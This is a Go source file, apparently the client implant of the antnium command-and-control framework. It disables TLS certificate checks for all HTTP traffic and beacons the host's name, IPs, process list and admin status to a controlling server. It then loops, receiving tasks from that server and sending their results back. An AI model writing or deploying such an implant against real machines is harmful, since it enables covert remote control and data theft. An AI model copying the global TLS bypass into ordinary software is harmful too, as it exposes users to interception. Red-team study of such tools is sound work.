package client

import (
	"crypto/tls"
	"errors"
	"net/http"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   *ClientConfig
	Campaign *campaign.Campaign

	Upstream          Upstream
	DownstreamManager *DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := campaign.MakeCampaign()
	upstream := MakeUpstreamHttp(&config, &campaign)
	downstreamManager := MakeDownstreamManager(&upstream)

	w := Client{
		&config,
		&campaign,
		&upstream,
		&downstreamManager,
	}
	return w
}

// Start will connect to upstream. Required before using Loop()
func (c *Client) Start() error {
	// Connect even with invalid TLS certificates (e.g. Mitm proxy)
	// by enable SkipVerify on all instances of http
	//   https://stackoverflow.com/questions/12122159/how-to-do-a-https-request-with-bad-certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// "Connect" to the server, mostly to check if we have internet connection and are not blocked
	c.Upstream.Connect()
	go c.Upstream.Start()

	go c.sendPing() // Thread: sendPing

	return nil // We dont care about problems here atm
}

// Loop will forever check for new packets from server
func (c *Client) Loop() {
	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-c.Upstream.Channel()

		p, err := c.DownstreamManager.Do(p)
		if err != nil {
			log.Error("Err: ", err.Error())
		}

		// Send answer back to server
		c.Upstream.Channel() <- p
	}
}

// sendPing is a Thread which tries to send initial ping packet to the server, lifetime: until success
func (c *Client) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = c.Config.Hostname
	model.AddArrayToResponse("localIp", c.Config.LocalIps, response)
	response["arch"] = c.Config.Arch
	model.AddArrayToResponse("processes", c.Config.Processes, response)
	isElevated, isAdmin, err := arch.GetPermissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}

	packet := model.NewPacket("ping", c.Config.ComputerId, "0", arguments, response)
	for {
		err := c.Upstream.SendOutofband(packet)
		if err == nil {
			break // when no error -> success
		}
		time.Sleep(time.Minute * 10) // 10mins for now
	}
}
